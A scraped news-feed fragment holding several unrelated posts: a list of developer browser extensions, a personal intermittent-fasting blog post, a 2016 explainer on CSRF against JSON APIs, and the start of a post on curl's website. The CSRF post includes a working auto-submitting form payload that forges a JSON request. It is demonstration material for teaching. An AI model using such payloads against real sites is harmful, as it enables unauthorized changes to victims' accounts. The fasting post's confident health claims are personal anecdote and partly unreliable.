rel="noopener"><strong>Opera</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="7a68"><a href="https://chrome.google.com/webstore/detail/grepper/amaaokahonnfjjemodnpmeenfpnnbkco?ref=designrevision.com" rel="noopener"><strong>Grepper</strong></a></h2><p id="6872">Imagine you’re doing a Google search and the answer, the exact answer you were looking for, is just there, no searching around, it’s just there. Well, this extension is helping achieving this dream of ours. Note. +2</p><p id="57fc"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/grepper/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="9635"><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" rel="noopener"><strong>Firefox Multi-Account Containers</strong></a></h2><p id="ad69">Use this one to segregate various accounts based on their “nature”. A good extension to have when you want to enhance your privacy and experience during dev testing. Note. Of course it’s on <a href="https://medium.com/u/95f4ec6ae6f6?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Mozilla</a> and <a href="https://medium.com/u/7f273c236233?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Firefox</a>!!</p><p id="ef51"><strong>Note. Only on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/" rel="noopener"><strong>Firefox</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="9960"><a href="https://chrome.google.com/webstore/detail/notion-web-clipper/knheggckgoiihginacbkhaalnibhilkk" rel="noopener"><strong>Notion Web Clipper</strong></a></h2><p id="e0b9">This (pretty known) extension lets you add links to <a href="https://medium.com/u/efd97a1c507b?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Notion</a>’s databases directly from your web browser. Easy peasy.. lemon squeezy. Note. This will free yourself from hunting through your bookmarks.</p><p id="9568"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/notion-web-clipper/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="bba5"><a href="https://chrome.google.com/webstore/detail/ghostery-%E2%80%93-privacy-ad-blo/mlomiejdfkolichcflejclcbmpeaniij" rel="noopener"><strong>Ghostery</strong></a></h2><p id="1450">A must-have. This add-on will help you detect <em>threats</em> like beacons, behavioral data providers, block scripts, and more. No more inappropriate ads for you!</p><p id="d708"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/ghostery/" rel="noopener"><strong>Mozilla</strong></a><strong> and </strong><a href="https://addons.opera.com/en/extensions/details/ghostery/" rel="noopener"><strong>Opera</strong></a><strong>!</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="71e2"><a href="https://chrome.google.com/webstore/detail/moesif-origin-cors-change/digfbfaphojjndkpccljibejjbppifbc" rel="noopener"><strong>Moesif Origin &amp; CORS Changer</strong></a></h2><p id="bf07">This plugin allows you to send cross-domain requests directly from the browser without receiving Cross-origin Errors! Note. I must confess.. I didn’t try this one yet.</p><p id="1175"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/moesif-origin-cors-changer1/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="8ba5"><a href="https://chrome.google.com/webstore/detail/lighthouse/blipmdconlkpinefehnmjammfjpmpbjk" rel="noopener"><strong>Lighthouse</strong></a></h2><p id="4bf5">This is an open-source tool created by <a href="https://medium.com/u/991272e72e68?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Google Developers</a>. It’s used as a baseline by a good number of front-end developers to assess various performance metrics of web pages. This add-on can help in improving the quality of your website by running a number of tests called “audits” under simulated conditions. (e.g. how will a webpage perform on a laptop with a slow internet connection, etc.)</p><p id="1edb"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/google-lighthouse/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="0744"><a href="https://chrome.google.com/webstore/detail/marmoset/npkfpddkpefnmkflhhligbkofhnafieb?hl=en" rel="noopener">Marmoset</a></h2><p id="96fb">Used it a couple of times when writing articles that needed to include some code snippets. Ads you have probably guessed, this small extension will allow you to take code snapshots with one click.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*JlAgx_FsG5VU2K1mvq5M3w.png" width="1400" height="98" srcset="https://miro.medium.com/max/552/1*JlAgx_FsG5VU2K1mvq5M3w.png 276w, https://miro.medium.com/max/1104/1*JlAgx_FsG5VU2K1mvq5M3w.png 552w, https://miro.medium.com/max/1280/1*JlAgx_FsG5VU2K1mvq5M3w.png 640w, https://miro.medium.com/max/1400/1*JlAgx_FsG5VU2K1mvq5M3w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*JlAgx_FsG5VU2K1mvq5M3w.png?q=20"></p></div></div></div></figure><p id="c769">While building our main product which is focused on monitoring various engineering metrics — for Engineering Managers, Developer Experience teams — we’ve built a complementary <a href="https://indorse.io/metamorph/extension" rel="noopener"><strong>free browser extension</strong></a> that can be used to inspect Git repo on GitHub, GitLab, and Bitbucket.</p><p id="f2e9">On <a href="https://chrome.google.com/webstore/detail/metamorph/fpmahcaijpfjkckfdppolkfmheooefem" rel="noopener"><strong>Chrome</strong></a><strong> </strong>or <a href="https://addons.opera.com/en/extensions/details/metamorph-2/" rel="noopener"><strong>Opera</strong></a>.</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.indorse.io/20-useful-browser-extensions-for-devs-2d023da2a3d0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197283</guid>
            <pubDate>Tue, 24 Nov 2020 10:52:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Goodbye breakfast: 6 months of Intermittent Fasting]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25197199">thread link</a>) | @beatlevic
<br/>
November 24, 2020 | https://beatletech.com/2020/11/24/goodbye-breakfast | <a href="https://web.archive.org/web/*/https://beatletech.com/2020/11/24/goodbye-breakfast">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            
            

            <p>Tuesday, 24 November 2020.</p>

            <p><img src="https://s3-eu-west-1.amazonaws.com/eu-west-1.beatletech.com/images/intermittent-fasting-mogwai-16-8-blue.png" alt="Intermittent Fasting 16/8" width="70%" title="Intermittent Fasting 16/8"></p>

<p><em><strong>DISCLAIMER:</strong> I’m not an MD, so please read this blog post only as an interesting starting point for your own research and always check with your own doctor or dietician if you want to try this at home. You are responsible for your own health.</em></p>

<hr>

<p>For the past 6 months I have been doing <code>intermittent fasting</code> (IF) by eating daily only during an 8 hour window: between noon and 8pm. On top of that I had three water-only fasts where I didn’t eat anything for multiple days (4-5) in a row.</p>

<p>That’s madness you might say! Why would you starve yourself? Breakfast is the most important meal of the day and you are skipping it!</p>

<p>Well, I currently believe that it would be madness NOT to fast, and have both scientific and 6 months of anecdotal evidence to back that up. When I was just a few weeks into intermittent fasting, I was already so positively surprised by the initial results that I wanted to tell everybody about my “discovery”, especially because I believed I could also explain why and how it works after reading into the physiology and research behind it. I decided to first see if I could stick with it for a couple of months and then write about my experiences. So here I am, 6 months later, ready to tell you all about my journey and “why” intermittent fasting is so interesting.</p>

<h3 id="benefits">Benefits</h3>

<p>Before we dive in, what’s in it for you? What kind of benefits are we talking about? There are the following immediate known and lasting benefits that I experienced:</p>
<ul>
  <li>Weight loss</li>
  <li>Higher levels of energy</li>
  <li>Feeling stronger (due to increase in human growth hormone)</li>
  <li>Better focus</li>
  <li>Decrease in hay fever symptoms (to be fair, I could have been lucky with a mild season)</li>
</ul>

<p>And there are (potential) long term benefits (<a href="https://www.nejm.org/doi/full/10.1056/nejmra1905136">1</a>, <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3106288/">2</a>, <a href="https://www.healthline.com/nutrition/10-health-benefits-of-intermittent-fasting">3</a>):</p>
<ul>
  <li>Cellular repair (Autopaghy)</li>
  <li>Decreased <a href="https://www.webmd.com/diabetes/insulin-resistance-syndrome">insulin resistance</a></li>
  <li>Decreased incidence of diseases, including cancers, obesity, neurological disorders and cardiovascular disease.</li>
  <li>Increased stress resistance</li>
  <li>Increased longevity and quality of life</li>
</ul>

<p>Fasting sounds like a miracle drug doesn’t it? You don’t even have to pay money for it! That’s also probably why you won’t see any fasting ads on your timeline or tv commercials (e.g., “Stop buying our cornflakes and just skip breakfast now!”). It is essentially free and available for you to try out.</p>

<p>Without further ado, let’s explore intermittent fasting and why it works.</p>

<h3 id="intermittent-fasting">Intermittent Fasting</h3>

<p>People have been actively fasting, i.e., periods of consciously not eating, since ancient times (<a href="https://thefastingmethod.com/fasting-a-history-part-i/">4</a>) and it has, unwillingly, been part of the eating pattern of our ancestors when food wasn’t always around (e.g. hunting on an empty stomach), although strictly speaking you would call it starvation if you don’t know when you will get your next meal. It just shows, that our bodies have been evolutionary adapted to handle feast and famine. It’s being exposed to stress, variability, volatility and randomness (up to a point and not continuously), that makes us stronger (i.e., <a href="https://en.wikipedia.org/wiki/Antifragile">antifragile</a>).</p>

<p>Recently intermittent fasting has become a more popular form of fasting, which can be defined as <strong>an eating pattern in which you cycle between periods of eating and fasting</strong>, where you stretch each fasting period long enough to force your body into switching from burning glucose (sugar) and glycogen (stored sugar) to fat burning. This is what is called <code>metabolic flexibility</code>, where your body makes use of whatever fuel is available. As a bonus, it seems that ketosis (i.e., the metabolic state running on fat for fuel) is the main driver for fat burning in the abdomen region, belly fat!</p>

<p><strong>So how long do you have to NOT eat to switch to fat burning?</strong> Apparently, energy intake restriction for 10 to 14 hours results in depletion of liver glycogen stores (<a href="https://www.nejm.org/doi/full/10.1056/nejmra1905136">1</a>, <a href="https://www.semanticscholar.org/paper/Fuel-metabolism-in-starvation.-Cahill/a8bb8327226d35259e68ecd8edcc17a3a1380f4a">5</a>) after which fat, fatty acids, are freed to form <code>ketones</code> that are used to fuel your body (as opposed to glucose). The more <code>fat adapted</code> you are, the quicker your body will switch to fat burning, something you get more adapted to as a result of prolonged intermittent fasting.</p>

<p>Given the required minimum of 10 to 14 hours of fasting to start producing ketones, you have different patterns for intermittent fasting you could follow:</p>
<ul>
  <li><strong>16/8</strong>: A daily window of 8 hours, often from noon to 8pm (so no breakfast), for eating and 16 hours of fasting (during the night and morning).</li>
  <li><strong>5:2</strong>: 5 days eating, 2 days fasting.</li>
  <li><strong>Alternate day</strong>: Alternate days of eating and fasting</li>
  <li><strong>One Meal a Day (OMAD)</strong>: Sticking to one meal a day, often dinner, and fast the rest of the day.</li>
</ul>

<p>I chose <strong>16/8</strong>, because it fits nicely with having kids that are not on a fasting schedule (nor should they ever be when they are young and still growing), having lunch and dinner together. I also like the consistency of following the same schedule every day, apart from sporadic multi-day periods of water-only fasts (more on that later).</p>

<p><strong>Aren’t you also burning up your muscles during fasting?</strong> Nope. Your body is naturally preserving your muscles by increasing <code>human growth hormone</code> (HGH), which also helps building muscles after the fasting period as HGH levels remain high.</p>

<p><strong>So all the benefits come from fat burning and the increase in human growth hormone?</strong> Actually those account for only part of the benefits. The third and arguable the most interesting process during fasting is called <code>autophagy</code>, which literally translates to “self eating”, an apt description for the cellular repair and rejuvenation that will happen in your body.</p>

<h4 id="autophagy">Autophagy</h4>

<p>Your body continuously needs amino acids, the building blocks for new cells, and when you are not eating you are not taking in new amino acids (proteins). The body already recycles your old and damaged cells to harvest these building blocks, but during fasting has to work harder to get enough of this material. It does this by increasing your immune system in order to “scavenge” in all the nooks and crannies of your body for cells to break down. Cells that otherwise would be “good enough yet mediocre” are now also recycled.</p>

<p>This is the only process known to rejuvenate neural pathways when you are getting older, and you will be safeguarding and protecting yourself against neurological and auto-immune disorders (<a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3106288/">2</a>).</p>

<p>The importance of autophagy has also been clearly demonstrated by Japanese cell biologist Yoshinori Ohsumi, who won, in 2016, the Nobel Prize in Medicine for his research on this very topic, showing how autophagy helps slow down the aging process (<a href="https://www.nobelprize.org/prizes/medicine/2016/press-release/">6</a>).</p>

<h4 id="key-concepts">Key concepts</h4>

<p>Now that we covered what intermittent fasting is, how it works and benefits you, by going over some of the key concepts: the metabolic switch to fat burning, the increase in human growth hormone and autophagy. I like to move on to sharing my experience of putting intermittent fasting into practice.</p>

<h3 id="my-6-month-journey">My 6 Month Journey</h3>

<p>During the first Coronavirus lockdown in April (in the Netherlands), I spent most of my time homeschooling my three kids and working for <a href="https://rekall.ai/">rekall.ai</a>, while neglecting sporting activities and not eating healthy consistently (e.g., more snacks). So when the kids were allowed to go back to school again in May, I stepped on the scale and found myself nearing 100 kg. This for me, being 1.98m tall (6’6”), meant I was being borderline overweight according to my <a href="https://www.nhlbi.nih.gov/health/educational/lose_wt/BMI/bmicalc.htm">BMI</a> calculation (&gt;25). I have never seen myself weigh more than 100 kg (220 lb) and didn’t want to see that happen, so it was time for action!</p>

<p>I set a weight goal to lose 8 kg in 6 weeks and weigh no more than 90 kg (200 lb) on my birthday (June 26th). In order to get there I wanted to follow a low-carb Paleo diet (<a href="https://www.mayoclinic.org/healthy-lifestyle/nutrition-and-healthy-eating/in-depth/paleo-diet/art-20111182">Caveman diet</a>), which I had followed 10 years prior with great <a href="https://about.me/beatlevic">results</a>. Doing some online research and catching up on Youtube with low-carb and Keto diets, is when I stumbled upon intermittent fasting videos (<a href="https://youtu.be/thZFIPOAGNQ">7</a>, <a href="https://youtu.be/thgVz3837l0">8</a>, <a href="https://youtu.be/LLVf3d0rqqY">9</a>). As you know by reading this far, the benefits of IF sounded amazing, so I decided, under the medical supervision of my wife, who is an actual MD, to go all in.</p>

<h4 id="weight-loss-results">Weight loss results</h4>

<p>In the following annotated graph you can view my weight over the course of the past 6 months. I’ll provide you with more context in the next sections.</p>







<h4 id="first-2-weeks">First 2 weeks</h4>

<p>I started May 13th weighing <strong>97.9 kg</strong> (A). To keep track of my eating window I set two alarms, one at 12.30pm labeled ‘lunch’ and the other at 8pm ‘no more eating’. For my exercise routine I started to play tennis on Monday mornings, and I tried to run 6-7 km twice a week.</p>

<p>I switched to a low-carb diet (Paleo): eating more meat, salads, fruits (primarily berries), vegetables and nuts. No longer eating bread, pasta, rice and oatmeal.</p>

<p>After one week I already lost 2 kg, and another 1 kg after the second week. I found it very easy to stick to the 8 hour eating window and I was not experiencing hunger sensations in the morning or late evenings. Probably because I was already used to skipping breakfast quite often, and because a low-carb diet also helps lowering your insulin spikes and cravings for more sugar. With lower insulin levels, as a result of lower overall blood sugar, you are also quicker in switching to fat burning!</p>

<h4 id="water-only-fasting">Water-only Fasting</h4>

<p>With this great start, I was feeling bullish about the changes and progression I had made, but I wanted to push fasting a bit harder. So I decided to try water-only fasting, i.e., eating nothing for a couple of days and only consuming water and some minerals (salt for electrolytes). In theory, your body should just switch to fat burning after 12 hours, increase your level of human growth hormone and increase your adrenaline and metabolism.</p>

<p><strong>So what about water-only fasting in practise?</strong> If you would have asked me a year ago, I would have guessed you would continuously feel very hungry and tired. Now I can tell you from experience that it is nothing like that, and that I continued to have plenty of energy throughout the 5 days that I fasted (B-C). Yes, you will feel a bit hungry around the times you would normally eat, but that feeling passes quickly. I believe being on IF together …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://beatletech.com/2020/11/24/goodbye-breakfast">https://beatletech.com/2020/11/24/goodbye-breakfast</a></em></p>]]>
            </description>
            <link>https://beatletech.com/2020/11/24/goodbye-breakfast</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197199</guid>
            <pubDate>Tue, 24 Nov 2020 10:36:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Posting JSON with an HTML Form (2016)]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25197155">thread link</a>) | @graderjs
<br/>
November 24, 2020 | https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html | <a href="https://web.archive.org/web/*/https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>A coworker and I were looking at an application today that, like so many other
modern web applications, offers a RESTful API with JSON being used for
serialization of requests/responses.  She noted that the application didn’t
include any sort of CSRF token and didn’t seem to use any of the headers
(X-Requested-With, Referer, Origin, etc.) as a “poor man’s CSRF token”, but
since it was posting JSON, was it really vulnerable to CSRF?  <strong>Yes, yes,
definitely yes!</strong></p>

<p>Interestingly, this is reminiscent of many of the confusions between server and
browser that are described in Michal Zalewski’s <a href="https://amzn.to/2QyTUaH">The Tangled
Web</a>.</p>

<p>The idea that the use of a particular encoding is a security boundary is, at
worst, a completely wrong notion of security, and at best, a stopgap until W3C,
browser vendors, or a clever attacker gets hold of your API.  Let’s examine JSON
encoding as a protection against CSRF and demonstrate a mini-PoC.</p>

<h3 id="the-application">The Application</h3>

<p>We have a basic application written in Go.  Authentication checking is elided
for post size, but this is <em>not</em> just an unauthenticated endpoint.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td><pre><span>package</span> <span>main</span>

<span>import</span> <span>(</span>
	<span>"encoding/json"</span>
	<span>"fmt"</span>
	<span>"net/http"</span>
<span>)</span>

<span>type</span> <span>Secrets</span> <span>struct</span> <span>{</span>
	<span>Secret</span> <span>int</span>
<span>}</span>

<span>var</span> <span>storage</span> <span>Secrets</span>

<span>func</span> <span>handler</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
	<span>if</span> <span>r</span><span>.</span><span>Method</span> <span>==</span> <span>"POST"</span> <span>{</span>
		<span>json</span><span>.</span><span>NewDecoder</span><span>(</span><span>r</span><span>.</span><span>Body</span><span>)</span><span>.</span><span>Decode</span><span>(</span><span>&amp;</span><span>storage</span><span>)</span>
	<span>}</span>
	<span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>"The secret is %d"</span><span>,</span> <span>storage</span><span>.</span><span>Secret</span><span>)</span>
<span>}</span>

<span>func</span> <span>main</span><span>()</span> <span>{</span>
	<span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>handler</span><span>)</span>
	<span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>)</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>As you can see, it basically serves a secret number that can be updated via
HTTP POST of a JSON object.  If we attempt a URL-encoded or multipart POST, the
JSON decoding fails miserably and the secret remains unchanged.  We must POST
JSON in order to get the secret value changed.</p>

<h3 id="exploring-options">Exploring Options</h3>

<p>So let’s explore our options here.  The site can locally use AJAX via the
XMLHTTPRequest API, but due to the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same-Origin
Policy</a>,
an attacker’s site cannot use this.  For most CSRF, the way to get around this
is plain HTML forms, since form submission is not subject to the Same-Origin
Policy.  The W3C had a <a href="https://www.w3.org/TR/html-json-forms/">draft specification for JSON
forms</a>, but that has been abandoned
since late 2015, and isn’t supported in any browsers.  There are probably some
techniques that can make use of Flash or other browser plugins (aren’t there
always?) but it can even be done with basic forms, it just takes a little work.</p>

<h3 id="json-in-forms">JSON in Forms</h3>

<p>Normally, if we try to POST JSON as, say, a form value, it ends up being URL encoded,
not to mention including the field name.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
</pre></td><td><pre><span>&lt;form</span> <span>method=</span><span>'POST'</span><span>&gt;</span>
  <span>&lt;input</span> <span>name=</span><span>'json'</span> <span>value=</span><span>'{"foo": "bar"}'</span><span>&gt;</span>
  <span>&lt;input</span> <span>type=</span><span>'submit'</span><span>&gt;</span>
<span>&lt;/form&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Results in a POST body of:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>json=%7B%22foo%22%3A+%22bar%22%7D
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Good luck decoding that as JSON!</p>

<p>Doing it as the form field name doesn’t get any better.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>%7B%22foo%22%3A+%22bar%22%7D=value
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It turns out you can set the enctype of your form to <code>text/plain</code> and avoid the
URL encoding on the form data.  At this point, you’ll get something like:</p>



<p>Unfortunately, we still have to contend with the form field name and the
separator (<code>=</code>).  This is a simple matter of splitting our payload across both
the field name and value, and sticking the equals sign in an unused field.  (Or
you can use it as part of your payload if you need one.)</p>

<h3 id="putting-it-all-together">Putting it All Together</h3>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre><span>&lt;body</span> <span>onload=</span><span>'document.forms[0].submit()'</span><span>&gt;</span>
  <span>&lt;form</span> <span>method=</span><span>'POST'</span> <span>enctype=</span><span>'text/plain'</span><span>&gt;</span>
    <span>&lt;input</span> <span>name=</span><span>'{"secret": 1337, "trash": "'</span> <span>value=</span><span>'"}'</span><span>&gt;</span>
  <span>&lt;/form&gt;</span>
<span>&lt;/body&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This results in a request body of:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>{"secret": 1337, "trash": "="}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>This parses just fine and updates our secret!</p>

  </div><p>This post contains affiliate links.  If you click on
a link, I may earn a small commission at no cost to you.</p></div>]]>
            </description>
            <link>https://systemoverlord.com/2016/08/24/posting-json-with-an-html-form.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197155</guid>
            <pubDate>Tue, 24 Nov 2020 10:26:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Curl Web Infrastructure]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197053">thread link</a>) | @virde
<br/>
November 24, 2020 | https://daniel.haxx.se/blog/2020/11/24/the-curl-web-infrastructure/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/11/24/the-curl-web-infrastructure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>The purpose of the <a href="https://curl.se/">curl web site</a> is to inform the world about what curl and libcurl are and provide as much information as possible about the project, the products and everything related to that.</p>



<p>The web site has existed in some form for as long as the project has, but it has of course developed and changed over time.</p>



<h2>Independent</h2>



<p>The curl project is completely independent and stands free from influence from any parent or umbrella organization or company. It is not even a legal entity,  just a bunch of random people  cooperating over the Internet. And a bunch of <a href="https://curl.se/sponsors.html">awesome sponsors</a> to help us.</p>



<p>This means that we have no one that provides the infrastructure or marketing for us. We need to provide, run and care for our own servers and anything else we think we should offer our users.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="187" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 187px) 100vw, 187px"></a></figure></div>



<p>I still do a lot of the work in curl and the curl web site and I work full time on curl, for <a href="https://www.wolfssl.com/">wolfSSL</a>. This might of course “taint” my opinions and views on matters, but doesn’t imply ownership or control. I’m sure we’re all colored by where we work and where we are in our lives right now.</p>



<h2>Contents</h2>



<p>Most of the web site is static content: generated HTML pages. They are served super-fast and very lightweight by any web server software.</p>



<p>The web site source exists in the <a href="https://github.com/curl/curl-www/">curl-www</a> repository (hosted on GitHub) and the web site syncs itself with the latest repository changes several times per hour. The parts of the site that aren’t static are mostly consisting of smaller scripts that run either on demand at the time of a request or on an interval in a cronjob in the background. That is part of the reason why pushing an update to the web site’s repository can take a little while until it shows up on the live site.</p>



<p>There’s a deliberate effort at not duplicating information so a lot of the web pages you can find on the web site are files that are converted and “HTMLified” from the source code git repository.</p>



<h2>“Design”</h2>



<p>Some people say the curl web site is “retro”, others that it is plain ugly. My main focus with the site is to provide and offer all the info, and have it be accurate and accessible. The look and the design of the web site is a constant battle, as nobody who’s involved in editing or polishing the web site is really interested in or particularly good at design, looks or UX. I personally have done most of the editing of it, including CSS etc and I can tell you that I’m not good at it and I don’t enjoy it. I do it because I feel I have to.</p>



<p>I get occasional offers to “redesign” the web site, but the general problem is that those offers almost always involve rebuilding the entire thing using some current web framework, not just fixing the looks, layout or hierarchy. By replacing everything like that we’d get a lot of problems to get the existing information in there – and again, the information is more important than the looks.</p>



